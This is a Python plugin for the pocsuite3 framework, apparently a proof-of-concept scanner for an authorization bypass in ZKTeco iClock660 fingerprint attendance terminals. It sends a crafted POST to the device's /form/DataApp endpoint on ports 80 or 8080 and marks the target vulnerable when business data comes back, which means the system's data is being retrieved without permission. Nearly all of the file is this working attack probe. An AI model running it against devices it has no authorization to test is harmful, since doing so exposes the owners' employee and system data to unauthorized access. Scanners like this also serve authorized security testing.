#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
import time
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


def check(url):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    url1 = url + "/form/DataApp"
    try:
        data = "style=2"
        req = requests.post(url1, data=data, headers=header, timeout=20)
        if req.status_code == 200 and 'businessData' in req.text:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False

class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = ''
    vulDate = '2022-04-15'
    createDate = '2022-04-15'
    updateDate = '2022-04-15'
    references = []
    name = 'iClock660越权下载系统数据库漏洞'
    appPowerLink = ''
    appName = 'iClock660越权下载系统数据库漏洞'
    appVersion = ''
    vulType = 'iClock660越权下载系统数据库漏洞'
    category = ''
    desc = '''
            中控指纹识别考勤终端iClock660越权下载系统数据库漏洞
    '''

    def _verify(self):
        '''
        verify:
        '''
        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [80, 8080]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            try:
                status = check(uri)
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = uri
                    break
            except:
                pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("target is not vulnerable")
        return output

register_poc(TestPOC)
